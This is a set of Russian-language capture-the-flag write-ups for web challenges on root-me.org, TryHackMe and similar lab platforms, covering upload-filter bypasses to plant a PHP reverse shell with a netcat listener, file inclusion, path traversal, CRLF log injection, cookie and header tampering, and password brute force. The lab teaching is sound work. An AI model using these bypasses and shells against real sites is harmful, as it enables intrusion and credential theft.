![[Pasted image 20240726112630.png]]

**Какие типы файлов принимает сайт?**

Есть несколько способов, с помощью которых мы можем попытаться определить типы файлов, которые загрузчик будет принимать. На странице мы видим инструкцию для пользователей, предлагающую использовать эту форму для загрузки изображений. Это дает нам хорошую подсказку о том, какие типы файлов мы сможем загружать.

Мы могли бы проверить нашу гипотезу, создав несколько разных файлов с разными типами файлов и попытавшись загрузить по одному из них, однако это может занять много времени. Более простым решением здесь может быть проверка исходного кода страницы, щелкнув правой кнопкой мыши и выбрав «Просмотреть исходный код страницы», а затем поиск HTML для формы или кнопки загрузки.

![[Pasted image 20240726115301.png]]

Ответ на вопрос №2: **image**

**Вопрос №3 В каком каталоге хранятся загруженные файлы?**

Если вы попробуете несколько обычных вариантов, то увидите, что все файлы попадают в каталог **/uploads/** :

![[Pasted image 20240726115432.png]]

Или просто используйте инструменты для поиска скрытых директорий.

![[Pasted image 20240726121548.png]]

**Вопрос №4 Что такое флаг в /var/www/flag.txt?**

И так такперь нужно установить обратную оболочку, его можно написать самому, скачать с гитхаба или сгенерировать с п.м. msfvenom, weevely или других инструментов. 

И как теперь нам загрузить нашу полезную нагрузку на сервер? Если вы помните, то в задаче упоминается метод атаки, т.е. двойное расширение (file.jpg.php). Веб-сервер разрешит файл после проверки первого расширения .jpg и не будет проверять дальше.

Переходим к шагу 4, нам нужно создать файл, который выглядит как изображение (помните о расширении с двойным стволом, упомянутом выше) и содержит скрипт обратной оболочки. Вы можете найти скрипт обратной оболочки на сайте pentestmonkey или github

> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Скопируйте код, отредактируйте IP и порт (вы найдете часть в строках 49 и 50 с комментарием «//ИЗМЕНИТЕ ЭТО»). Эти поля содержат сведения о порте и IP, на котором мы будем захватывать запрос, поступающий с веб-сервера жертвы. Теперь сохраните файл с расширением изображения, а затем .php (так как это скрипт php) например `«имя_файла.jpg.php»`.  Мы изменили имя файла, чтобы обмануть форму загрузки и заставить ее думать, что это .jpg

Теперь пришло время для загрузки, выберите файл скрипта (возможно, вы не увидите файл, попробуйте изменить вид, чтобы показать все файлы) и отправьте скрипт. Вы увидите, что файл успешно загружен.

Шаг 5, запустите прослушиватель Netcat для захвата трафика. Команда будет ниже, и не забудьте номер порта, который вы добавили в скрипт, используйте тот же порт.

```bash
nc -nvlp 4444
```

Флаги, используемые с командой netcat(nc)

- l режим прослушивания, для входящих подключений
- n только числовые IP-адреса, без DNS
- p port локальный номер порта
- v подробный

Переходим в каталог где была загружена полезная нагрузка(`/uploads`), при открывая её мы запускаем скрипт. Получаем reverse shell и находим флаг который находится в `/var/www/flag.txt`
## File upload - null byte

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/File-upload-null-byte

Посмотрим описание.

![[Pasted image 20230108090047.png]]

По описанию можно понять, что речь пойдёт про загрузку шеллов, а также нам дают намёк, что придётся использовать нуль байт (про него я вроде бы уже писал, когда делал теоретический и практический разбор LFI).

Перейдём по ссылке и посмотрим, что нам предлагают.

![[Pasted image 20230108090117.png]]

Опять фото-галерея, как и в прошлых подобных заданиях (если вы следите за каналом, то уже был разбор нескольких заданий на загрузку шелла).

![[Pasted image 20230108090137.png]]

Видим, что загрузка производится только для картинок (как обычно). Попробуем в наглую загрузить шелл.

![[Pasted image 20230108090156.png]]

Получим ошибку, что не удивительно.

Итак, давайте немного подумаем. Нам сказали про нуль-байт. Данная фича работает при обращении к файлу на сервере. Смысл заключается в том, что при добавлении нуль-байта (%00) вся последующая информация сервером не обрабатывается, так как
он считает, что это конец строки (в СИ большая часть функций работающих со строками придерживаются той-же логики).

Таким образом мы можем сформировать подобный файл.

![[Pasted image 20230108090229.png]]

И загрузить его.

![[Pasted image 20230108090246.png]]

Видим, что он загрузился, но путь до файла всё равно содержит нуль-байт и расширение jpeg.

![[Pasted image 20230108090306.png]]

Попробуем обратиться к файлу без нуль-байта.

![[Pasted image 20230108090324.png]]

И получим наш пароль. Задание решено.

---

## File upload - MIME type

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Решим задание - "File upload - MIME type" 
Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type

Посмотрим описание.

![[Pasted image 20230107225641.png]]

Задание снова на загрузке шелла. На этот раз речь (судя по названию) нужно обойти MIME type.

Перейдём на сайт и посмотрим, что нам предлагают.

![[Pasted image 20230107225703.png]]

Есть опция загрузки. Посмотрим как она выглядит.

![[Pasted image 20230107225718.png]]

Не отличается от прошлого задания. Попробуем загрузить шелл, используемый в прошлом решении.

![[Pasted image 20230107225736.png]]

Загрузка прошла, однако немного неясно, где был сохранён файл. Поищем его.

![[Pasted image 20230107225758.png]]

Если обновить страницу загрузки, то можно увидеть ссылку на загруженный ранее файл. Попробуем обратиться к нему.

![[Pasted image 20230107225820.png]]

Как можно заметить, двойное расширение не сработало. Попробуем загрузить файл с расширением .php при этом в процессе загрузки подменим тип и файл будет содержать magic-number для jpeg изображения.


![[Pasted image 20230107225843.png]]

Запрос выглядит так (поле Content-Type изменяется в процессе запроса с помощь перехвата его в Burp'e).

Посмотрим ответ.

![[Pasted image 20230107225908.png]]

Файл загружен. Отлично, проверим его.

![[Pasted image 20230107225922.png]]

Всё верно, код отрабатывает. Сделаем "ls", чтобы показать, что сейчас загружено 2 файла и просто прочитаем флаг. Теперь нужно найти пароль, в задаче уже нам подсказали что пароль хранится в `.passwd`. Давай осмотрим каталоги:

```bash
ls -al ../
ls -al ../../
ls -al ../../../
```

Псоле того как нашли файл:

![[Pasted image 20230107225949.png]]

Пароль получен. Задание решено.  

Это ещё один пример загрузки шеллов на сервер.

---

## File upload - double extensions

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/File-upload-double-extensions

Посмотрим описание.

![[Pasted image 20230107225059.png]]

Итак, нам полностью сказано, что надо сделать и где лежит пароль для задания. Мы должны загрузить в фото-галерею файл с php-кодом и достать пароль из файла .passwd в корневой директории данного приложения.

Зайдём на сайт и увидим, следующее.

Как можно заметить, это действительно похоже на фото-галерею, но это не самое интересное. Мы видим вкладку "upload" в небольшом меню. Давайте попробуем перейти в неё и загрузить какой нибудь файл.

![[Pasted image 20230107225202.png]]

Итак, мы видим, что можно загружать свои фотографии, однако они должны быть строго определённого формата.

Попробуем один из самых простых способов обхода данного фильтра, а именно "файл с двойным расширением".

Создадим такой файл.

![[Pasted image 20230107225251.png]]

Это достаточно распространённый простой шелл, с указанием в начале констант, которые соответствуют изображению. Также обязательно надо указать двойное расширение (сначала .php потом .jpeg)

Всё дело в том, что при загрузке файл будет распознавать по последнему расширению (то есть как изображение), а при обращении к файлу, сервер попытается изначально открыть его по первому найденному расширению (если это не запрещено в настройках
сервера), то есть по расширению ".php".

Загружаем файл.

![[Pasted image 20230107225328.png]]

После отправки этого запроса, получаем результат загрузки файла.

![[Pasted image 20230107225344.png]]

Файл успешно загружен, его тип определился как изображение, а также нам показали путь по которому файл сохранён. Попробуем перейти по нему.

![[Pasted image 20230107225403.png]]

Отлично, мы можем выполнять код на сервере. Теперь просто прочитаем необходимый файл.

Отлично, мы можем выполнять код на сервере. Теперь просто прочитаем необходимый
файл.

![[Pasted image 20230107225441.png]]

И получаем наш пароль. Проверим его.


---
# [[LFI_and_RFI | RFI]]

## Remote File Inclusion

**Платформа:** https://www.root-me.org/
**Уровень:** Easy


![[Pasted image 20230108193958.png]]

Не один раз разбирались задания по LFI, то есть локальному включению файлов на сервере, на этот раз задание на удалённое включение файлов. Перейдём по ссылке и посмотрим, что нам предлагается.

![[Pasted image 20230108194019.png]]

Видим простую страничку с возможностью выбора языка. Попробуем сменить язык.

![[Pasted image 20230108194042.png]]

При смене языка установился некоторый параметр "lang". Попробуем передать туда локальный файл.

![[Pasted image 20230108194101.png]]

Получаем ошибки. Так как нам уже дали понять, что это удалённое подключение файлов, нам нужно передать в параметр URL к файлу с некоторым кодом на PHP, который будет выполнен. Здесь возникает некоторая проблема с тем, как нам получить такой URL? Самый простой вариант это иметь свой внешний сервер, поднять на нём любой веб-сервер и положить туда необходимый файл.

В случае использования онлайн файлообменников, нужно помнить о том, что ссылка к файлу должна заканчиваться на .php, а также по ссылке должен быть доступен только данные этого файла, а не прочий html-код, который его окружает. То есть у вас должна быть прямая ссылка на скачивание, которая заканчивается расширением .php, для того, чтобы сервер её верно обработал.

И ещё один нюанс, доступ должен быть по http, это сильно вредит, т.к. использовать github в данном случае не получится, т.к. будет ошибка при обработке ссылки. 
 
Несмотря на все эти нюансы, есть интересный способ обхода расширения, но рассказать о нём было бы довольно просто, поэтому подумайте над этим сами. С помощью этого способа можно запросто решить задание использую pastebin.

![[Pasted image 20230108194213.png]]

Задание решено. Получаем наш пароль простым чтением index.php

---
# [[LFI_and_RFI|LFI]]

## Local File Inclusion

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Смотрим описание.

![[Pasted image 20230107184248.png]]

Из названия понятно про какую уязвимость пойдёт речь. На канале есть теоретический и практический пост про данную уязвимость, а также пример с варгейма Natas.

Теория.

Практика.

Пример (задание номер 8). Поэтому особой теории по данному заданию не будет, просто перейдём к решению.

![[Pasted image 20230107184321.png]]

Попадаем на сайт и сразу видим ряд файлов или папок на которые можно перейти.

![[Pasted image 20230107184335.png]]

Перейдём на одну из предложенных ссылок и убедимся в том, что это папки, а внутри них файлы. При этом устанавливается параметр ﬁles с именем папки.

![[Pasted image 20230107184357.png]]

При открытии файлы мы видим его содержимое и добавляется ещё один параметр - f, который отвечает за файл в данной папке.

Внимательно посмотрим на правую часть сайта.

![[Pasted image 20230107184438.png]]

Мы находимся на сайте в качестве гостя, но можно быть и админом, однако при попытке залогиниться как админ вылетает форма авторизации, однако при её отклонение мы видим, что существует папка admin.

![[Pasted image 20230107184500.png]]

Попробуем прочитать содержимое данной папки.

![[Pasted image 20230107184525.png]]

Видим один файл, откроем его.

![[Pasted image 20230107184540.png]]

Читаем файл и видим имя пользователя admin и пароль, пробуем их для формы и они подходят.

Задание решено. Оно ока залось не сложным и довольно хорошо демонстрирует базовую концепцию уязвимости LFI.

---

## Local File Inclusion - Double encoding

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Сегодня разберём задачу "Local File Inclusion - Double encoding".

![[Pasted image 20230108150648.png]]

Из названия уже сразу видим, какая уязвимость нас будет ждать. Однако можно заметить, что есть примечание на счёт двойной кодировки, что мы учтём. 

Перейдём на сайт с заданием и сразу заметим вверху меню.

![[Pasted image 20230108150709.png]]

Попробуем перейти по одной из вкладок.

![[Pasted image 20230108150724.png]]

Сразу видим, что нам выставлен параметр. Попробуем засунуть в него какой нибудь пейлоад для LFI.

![[Pasted image 20230108150756.png]]

Он обнаружил атаку. Попробуем использовать технику с php-фильтром (описано в решение этого задания - [ссылка](https://tgraph.io/CTF-Kurs-molodogo-bojca-Nachalnye-zadaniya-kategorii-WEB-5-10-15))

![[Pasted image 20230108150920.png]]

Опять атака обнаружена. Попробуем закодировать всё это в full url encode. Нам ведь сказали про двойное кодирование <...> к сожалению, это не даст результатов. 

Попробуем закодировать два раза, у нас ведь указано в задании про "double encode".

![[Pasted image 20230108150958.png]]

Пробуем.

![[Pasted image 20230108151011.png]]

Отлично, оно отработало, но с ошибкой теперь просто попробуем открыть файл cv. 

Задекодим полученные данные и посмотри на скрипт.

![[Pasted image 20230108151033.png]]

Подключается какой-то конфиг, его и посмотрим.

![[Pasted image 20230108151050.png]]

Отлично флаг найден. Задание решено.

---

## PHP ﬁlters

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

На этой задаче у нас уязвимость  LFI с п.м. php wrappe. Простыми словами php wrapper lfi

Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/PHP-ﬁlters

Смотрим описание.

![[Pasted image 20230107182801.png]]

По заданию нам надо получить пароль администратора, обратим внимание на название задания, а также на прикреплённые источники.

![[Pasted image 20230107182838.png]]

Много ссылок на LFI. 

Заходим на само задание и видим две ссылки.

![[Pasted image 20230107182859.png]]

Прейдём на login и обратим внимание на строку запроса.

![[Pasted image 20230107182931.png]]

Внимание сразу привлекает параметр "inc" который принимает в качестве значения название скрипта. Похоже на LFI. Только есть проблема, судя по всему данный файл "выполняется", то есть содержащийся в нём php-код выполняется на сервере при загрузке данного файла, то есть по сути файл подгружен, но полный его исходный код не увидеть.

Для решения этой проблемы можно закодировать вывод данного файла в base64 для этого и используются php-фильтры.


![[Pasted image 20230107183010.png]]

Мы получаем большой вывод base64, декодируем его.

![[Pasted image 20230107183029.png]]

Видим, что скрипт подключает файл "conﬁg.php" и использует переменные $password и $username, которых нет в данном файле, прочитаем таким же образом файл "conﬁg.php"

![[Pasted image 20230107183132.png]]

Декодируем полученный base64 и получаем ответ.

![[Pasted image 20230107183207.png]]

Задание решено. Оно оказалось не сложным и довольно хорошо демонстрирует базовую концепцию уязвимости LFI с использованием php-фильтров.

---
# (Directory) Path Traversal

## Directory traversal

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Осталось одно задание "Directory traversal". Посмотрим его описание, хотя опять таки из названия знающие люди поймут, о чём пойдёт речь в задании.

![[Pasted image 20230108210045.png]]

Итак, нам надо найти скрытую секцию в галерее. Если кратко описать такую уязвимость как "Path Traversal" (к ней относится Directory traversal), то смысл её заключается в том, что манипулирую каким-либо параметром, который содержит в себе путь мы можем изменять текущую директорию и управлять таким образом выводов в свою пользу.

Зайдём по ссылке и посмотрим, что нам предлагают.

![[Pasted image 20230108210113.png]]

Какое-то небольшое приложение. Сразу видим гиперссылки, видимо, с названиями секций, перейдём в одну из них.

![[Pasted image 20230108210130.png]]

Отлично, у нас установился параметр с именем этой секции. Попробуем подняться на директорию выше.

![[Pasted image 20230108210200.png]]

Видим, какие-то странные результаты, посмотрим на них в Burp'e, там и запросы будет делать поудобнее.

![[Pasted image 20230108210229.png]]

Ага, видим здесь папку самой галереи и скрипт. Попробуем запросить скрипт.

![[Pasted image 20230108210245.png]]

Какие-то ошибки, видимо он пытается выполнится. Попробуем зайти в корень галереи, так как нам надо найти тайную секцию.

![[Pasted image 20230108210310.png]]

Среди обычных названий можно разглядеть "galerie///86hwnX2r", выглядит подозрительно. Попробуем открыть.

![[Pasted image 20230108210329.png]]

Видим файл "password.txt", обратимся к нему.

![[Pasted image 20230108210357.png]]

Получаем какие-то данные. Попробуем их сдать как пароль.

![[Pasted image 20230108210436.png]]

---

# CRLF

## CRLF 

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/CRLF

Посмотрим описание.

![[Pasted image 20230107193315.png]]

По заданию нам надо внедрить неверные данные в лог. Также, стоит обратить внимание на название задание, т.к. оно является названием одной из веб-уязвимостей, связанной с модификацией ответа от сервера с помощью специальных символов CR и LF (`\r\n`).

Символы ``\r\n`` являются идентификаторами конца строки в HTTP. Они могут быть использованы для обозначения переноса строк и в сочетании с заголовками HTTP-запросов и ответов могут приводить к различным уязвимостям, включая HTTP Request Smuggling и HTTP Response Splitting. 

С помощью данных символов можно отравлять веб-кеш, обходить веб-фаерволлы и другое.

Посмотрим, что нам предлагается в качестве задания.

![[Pasted image 20230107193434.png]]

Итак, есть лог аутентификации и форма. В логе мы видим записи вида "имя пользователя - не аутентифицирован/аутентифицирован". Судя по всему нам надо внедрить в лог сообщение "admin authenticated" не зная пароль, с помощью разбиения запроса, используя CRLF.

Присутствует форма с логином и паролем. Ниже для нашего удобства отображается лог аутентификации:

```
admin failed to authenticate.
admin authenticated.
guest failed to authenticate.
```

Видим что пользователь admin указал неверный пароль. Потом он успешно залогинился. После чего пользователь guest указал неверный пароль. Если попытаться залогиниться в форме с любым паролем (пусть будет "helloworld") под именем пользователя "internet-lab.ru", то в логе появится новая запись:

```
admin failed to authenticate.
admin authenticated.
guest failed to authenticate.
internet-lab.ru failed to authenticate.
```

При этом форма передаёт параметры в URL:

```
http://challenge01.root-me.org/web-serveur/ch14/?username=internet-lab.ru&password=helloworld
```

Пароль админа мы не знаем, но по заданию нам требуется подделать лог. Скорее всего от нас требуется дописать в лог строку, где говорится что admin успешно логинился:

```
admin authenticated.
```

Это можно сделать, если вставить символ перевода строки в имя пользователя, которое пишется в лог. Нам нужно сделать так, чтобы пользователя звали:

```
admin authenticated.
guest
```

Правим URL, перевод строки в URL пишется как "%0D%0A", имя пользователя получается "admin+authenticated.%0D%0Aguest". Формируем ссылку и переходим по ней:

```
http://challenge01.root-me.org/web-serveur/ch14/?username=admin+authenticated.%0D%0Aguest&password=helloworld
```

![[Pasted image 20240501200719.png]]

В лог удалось вставить нужный текст. А ниже нам на блюдечке подносят флаг! Валидируем.

**Решение с Burp:** Попробуес с Burp сделать обычный запрос с аутентификацией.

![[Pasted image 20230107193509.png]]

Видим, что имя пользователя записывается в лог, попробуем поставить символы переноса строки, чтобы отделить имя пользователя от сообщения об неверной аутентификации.

![[Pasted image 20230107193537.png]]

Сработало, мы перенесли сообщение об ошибке, теперь попробуем добавить в наш username сообщение об успешной аутентификации и предварительно заменим имя пользователя на "admin", а также после символов переноса подставим любое имя, чтобы переносимая запись выглядела логично. 

![[Pasted image 20230107193559.png]]

Как можно заметить, сообщение успешно добавлено и мы получаем флаг. Задание решено.

## Access logs

**Платформа:** https://defendtheweb.net
**Уровень:** Easy
**Описание:** На целевом сервере запущен сценарий автоматического запрета. Скрипт работает путем анализа файлов журналов на предмет неудачных попыток входа в систему. Скрипт блокирует любой IP-адрес на 10 секунд после каждой неудачной попытки входа в систему. Вывод журнала будет показан ниже. Попытайтесь войти в систему, избегая обнаружения.

![[Pasted image 20240808111459.png]]

И так у нас есть форма входа, и при попытке входа нас блокируют на 10 секунд. Попытка входа показывается в журнале. Нам нужно обойти таймер.

**Username:** `user1\nuser2`
**Password:** `Any`

![[Pasted image 20240808112147.png]]



---

# Request-based attacks

## HTTP Headers

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Задание "HTTP Headers".

Исходя из названия понятно про что пойдёт речь, посмотрим описание.

![[Pasted image 20230108204221.png]]

Зайдём по ссылке и посмотрим что нам предлагают.

![[Pasted image 20230108204247.png]]

А предлагают нам ничего. Зайдём в Burp и посмотрим на заголовки ответа.

![[Pasted image 20230108204300.png]]

Не сразу можно заметить интересный заголовок ответа "Header-RootMe-Admin".

![[Pasted image 20230108204330.png]]

Попробуем отправить его в нашем запросе с значением "True".

![[Pasted image 20230108204352.png]]

И получим пароль. Задание решено.

---
## HTTP cookies

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/HTTP-cookies

Посмотрим описание.

![[Pasted image 20230108085333.png]]

Исходя из описания и названия задания речь пойдёт про куки и скорее всего про их подмену. Перейдём по ссылке (кнопка Start the challenge) и посмотрим, что нам предлагают.

![[Pasted image 20230108085355.png]]

Какая-то форма сохранения email'ов и просмотр сохранённых почт. Попробуем нажать на просмотр почт.

![[Pasted image 20230108085421.png]]

Видим, что нам выдало сообщение о том, что мы не администратор, а также установился некоторый параметр "c" со значением "visiteur". Попробуем поменять его на admin.

![[Pasted image 20230108085449.png]]

Итак, видим, что теперь проблема в куки. Посмотрим на запросы к серверу с помощью перехватывающего прокси - Burp Suite.

![[Pasted image 20230108085508.png]]

Видим, что на сервер передаётся некоторая куки переменная ch7 со значением "visiteur", попробуем подменить её на admin.

![[Pasted image 20230108085530.png]]

И получим верный пароль. Ниже представлен запрос в Repeater'e.

![[Pasted image 20230108085548.png]]

Задание решено.

Вот такой простой пример подмены куки для получения доступа к другому аккаунта. Данная уязвимость имеет место быть в достаточно плохих веб-проектах, где разработчики совсем не заботяться о безопасности и разграничении доступа у пользователей. 

---

## Christmas Crisis

**Платформа:** https://tryhackme.com/
**Уровень:** Easy
**Комната**: [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2)

![[Pasted image 20240725215750.png]]

**Вопрос №1 Как называется файл cookie, используемый для аутентификации?**

Чтобы это сделать, сначала зарегистрируйте учетную запись в Центре управления Рождеством, а затем войдите в систему:

![[Pasted image 20240725215811.png]]

Отсюда вы можете увидеть куки аутентификации, проверив инструменты разработчика. Щелкните правой кнопкой мыши в любом месте страницы и выберите «Просмотреть элемент».

Файлы cookie можно найти на вкладке «Хранилище»: 

![[Pasted image 20240725215836.png]]

Легче использовать **Burpsuite**, но не суть. Здесь вы можете видеть, что имя просто «**auth**».

**Вопрос №2 В каком формате закодировано значение этого cookie-файла?**

В позиции значения вы можете скопировать весь файл cookie:

```
7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a22416c69656e4d6f6f2  
```

Используя идентификатор шифра, такой как [ЭТОТ](https://www.boxentriq.com/code-breaking/cipher-identifier) , вы можете увидеть, что это хранится в **шестнадцатеричном** коде. В интернете есть много разных анализаторов хэшей, шифров и кодировки. Используйте любой из них для идентификации.


![[Pasted image 20240725220332.png]]

**Вопрос №3 В каком формате хранятся данные после расшифровки cookie?**

Для расшифровки я использовал CyberChef:

![[Pasted image 20240725220948.png]]

Можно использовать любой другой дешифровщик, в интернете их тоже завалом. Даже лучше использовать то что всегда под рукой - **Python**.

Для этого я проверил подсказку. Там говорится, что формат данных очень распространен и часто ассоциируется с JavaScript. Это указывало на [**JSON**](https://www.w3schools.com/js/js_json_intro.asp) . Да и по формату видно что это JSON.

**Вопрос №4 Какова ценность печенья Санты?**

Чтобы получить значение cookie Санты, вам просто нужно изменить свое имя пользователя на «santa», а затем преобразовать его обратно в шестнадцатеричный код. Убедитесь, что вы используете строчную «s»:

![[Pasted image 20240725222453.png]]

**Вопрос №5 Какой флаг вы получаете, когда линия полностью активна?**

Для этого вернитесь в инструменты разработчика. Откуда вы скопировали исходное значение cookie, вставьте новое с именем пользователя Санты, нажмите Enter, а затем обновите страницу:

![[Pasted image 20240725222517.png]]

Легче перехватить запрос (**Burp**) и в удобном формате манипулировать им.

Теперь у вас должен быть контроль над консолью, где вы можете включать и выключать все:

![[Pasted image 20240725222734.png]]





---
## HTTP - Improper redirect

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/Improper-redirect

Посмотрим описание.

![[Pasted image 20230107192242.png]]

Задание связано с редиректом, нужно получить доступ к index. 

Попробуем перейти по ссылке.

![[Pasted image 20230107192319.png]]

При любом обращении к index.php попадаем на login.php?redirect

Попробуем обратится к index.php и перехватим запрос с помощью Burp Suite и отправим запрос в Repeater.

![[Pasted image 20230107192404.png]]

Теперь просто отправим данный запрос и если будет происходит редирект мы увидим это и пока не нажмём на кнопку принятия он не произойдёт.

![[Pasted image 20230107192424.png]]

Отлично, мы получили флаг и указание на данную проблему безопасности (CWE-698) и небольшое описание в чём заключается её смысл.

Вот такое простое задание, демонстрирующее возможные проблемы при плохой реализации редиректа.


---

## HTTP - POST

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/HTTP-POST

Посмотрим описание.

![[Pasted image 20230107191738.png]]

Судя по всему речь пойдёт об HTTP-методе POST. Нам надо найти путь получения топовых очков (судя по всему максимальных).

Перейдём по ссылке для начала решения задания.

![[Pasted image 20230107191805.png]]

Видим некоторую игру. В которой мы можем нажимать на кнопку и получать случайный результат. Необходимо, чтобы случайный результат был равен максимальному - 999999.

В задании указывалось что-то про методы, подключим Burp Suite и посмотрим какие запросы идут на сервер.

При нажатии на кнопку отправляется следующий запрос.

![[Pasted image 20230107191842.png]]

Видим, что число в параметре score отображается после запроса на странице и получается, что мы можем его контролировать. Давайте заменим его на максимальное 

![[Pasted image 20230107191921.png]]

Всё верно, мы победили в игру и получили флаг. Задание решено.

Данное задание демонстрирует основы отправки изменяющих запросов на сервер и показывает, что вы можете изменять отправляемые значения в надежде на изменение результата ответа от сервера.

---

## [[Уязвимость Open Redirect - Еще один блог веб-разработчика.pdf|HTTP - Open redirect]]

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect

Смотрим описание.

![[Pasted image 20230107190259.png]]

Судя по описанию, нам необходимо совершить переход на какой-либо другой домен, кроме предложенных.

Зайдём на сайт с заданием.

![[Pasted image 20230107190334.png]]

При нажатии на одну из ссылок получаем такой запрос.

![[Pasted image 20230107190350.png]]

Видим, что в параметре url передаётся адрес, по которому будет осуществлён переход. А в параметре h передаётся какой-то хеш, по формату похожий на md5. Правда, не ясно от чего он, поэтому попробуем найти его в базе.

![[Pasted image 20230107190415.png]]

Получается, что это хеш от адреса. 

Поменяем адрес на другой и запишем хеш от него в запрос.

![[Pasted image 20230107190438.png]]

Получаем флаг. Задание решено.

![[Pasted image 20240501191930.png]]


---

## [[HTTP Verb Tampering|HTTP verb tampering]]

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Смотрим описание.

![[Pasted image 20230107185604.png]]

Итак по заданию не особо понятно, что надо сделать, но если перейти по ссылке и начать решение, то станет ясно, что нужно обойти базовую аутентификацию. 

Задача: обойти аутентификацию. Bypass the security establishment.

В названии задания нам указали на метод, с помощью которого это можно сделать. Если подробно посмотреть про этот метод, то можно выяснить, что в файле .htaccess можно настроить базовую аутентификацию для разного рода запросов (GET, POST ...) и может получится так, то для запросов определённого рода не выставлены правила аутентификации и страница будет получена без ввода логина и пароля.

Уязвимость связана с неправильной настройкой разрешённых методов аутентификации web-сервера.

> Уязвимость HTTP Verb Tampering – ошибка настройки контроля доступа для методов протокола HTTP. Тупо аутентификация включена не для всех разрешённых на web-сервере HTTP методов.

Попробуем реализовать данную атаку с помощью Burp Suite. 

Обычный GET-запрос.

![[Pasted image 20230107185652.png]]

Требует авторизироваться. Меняет тип запроса на PUT.

![[Pasted image 20230107185708.png]]

Получаем ответ. Задание решено.

Вспомним некоторые HTTP-методы:

- GET — используется для получения информации от сервера по заданному URI.
- HEAD — тот же GET, но сервер посылает только заголовки и статусную строку без тела HTTP сообщения.
- POST — используется для отправки данных на сервер.
- PUT — используется для загрузки содержимого запроса на заданный URI.
- DELETE — удаляет указанный в URI ресурс.
- CONNECT — преобразует существующее соединение в тоннель.
- OPTIONS — используется для получения параметров текущего HTTP соединения.
- TRACE — создает петлю, благодаря которой клиент может увидеть, что происходит с сообщением на всех узлах передачи.

Бывают и другие, например: PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, SEARCH, POLL, NOTIFY и прочие. Наверное, появятся ещё какие-нибудь новые.

---
## HTTP - User-agent

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Следующее задание, которые мы решим называется "User-agent". Из его названия опять понятно, на что нужно обратить внимание.
Прямая ссылка: https://www.root-me.org/en/Challenges/Web-Server/User-agent Нажимаем на "Start the challenge" и видим следующее сообщение.

![[Pasted image 20230107160106.png]]

"user-agent" - это одно из полей HTTP-запроса, которое отвечает за описание браузера с которого происходит обращение к ресурсу. Изменим запрос с помощью инструментов разработчика (они открываются в разных браузерах по разному, но обычно достаточно нажать ПКМ на странице и выбрать опцию "Исследовать элемент", после откроется меню и там нужно выбрать категорию "Сеть", если у вас английская версия браузера, то у вас будет "Inspect elements" и "Network" соответственно, после находим запрос, изменяем его и отправляем. Меняем мы только User-Agent)

![[Pasted image 20230107160149.png]]

Смотрим ответ (он будет в самом низу списка запросов)

![[Pasted image 20230107160211.png]]

И получаем пароль.

Данное задание нацелено на основы работы с HTTP-заголовками. Задания такого рода очень часто встречаются на CTF'ах, при этом могут использоваться различные HTTP-заголовки, даже самые редкие, поэтому стоит знать хотя-бы самые базовые.

---
# Password attacks

## Weak password

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Далее решим задание "Weak password". Прямая ссылка: https://www.root-me.org/en/Challenges/Web-Server/Weak-password
По названию опять-таки понятно, на что необходимо обратить внимание.

![[Pasted image 20230107155028.png]]

Нажимаем на кнопку "Start the challenge" и попадаем на так называемую "Базовую аутентификацию". 

Попробуем ввести одну из самых простых и популярных комбинаций логина и пароля: "admin/admin". И получим сообщение о верном решении задания и о том, что введённый нами пароль "admin" можно использовать в качестве ответа на задание.

![[Pasted image 20230107155313.png]]

Задания такого рода иногда встречаются на CTF-cоревнованиях. Смысл таких заданий заключается в том, чтобы показать, что в форме логина может и не быть уязвимостей, однако администраторы могут использовать слабые или стандартные пароли для входа в систему. Часто во время проведения пентестов происходит брутфорс (полный перебор) паролей по словарю популярных паролей. Однако в CTF'ax брутфорс используется редко, т.к. это не особо интересно и затратно.

## Christmas Chaos

**Платформа:** https://tryhackme.com/
**Уровень:** Easy
**Комната**: [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2)

**Описание**: _МакСкиди идет по коридору и слышит слабый писк, Бип... Бип... Бип... по мере того, как МакСкиди приближается к комнате инженеров саней, слабый писк становится все громче и громче... БИП... БИП... Что-то явно не так! МакСкиди вбегает в комнату, хлопает дверью и видит, как панель управления санями Санты загорается красными сообщениями об ошибках! «Сани Санты! Их взломали, код красный... код красный!» — кричит он, бегом обратно в командный центр безопасности эльфов._

_Сможете ли вы помочь Макскиди и его команде взломать сани Санты и вернуть себе контроль?_

![[Pasted image 20240726151731.png]]

Тут много разных вариантов решения, либо использовать wfuzz, fuff, для перебор, или patator, hydra, medusa или можно использовать или можно использовать burp для перебора.

Инструментов много и всё на ваш цвет и вкус.

Перехвать -> Intruder -> Attack type: Cluster bomb 

![[Pasted image 20240726151409.png]]

Обычно правильной комбинацией является комбинация разной длины. 

С п.м. ffuf:

```bash
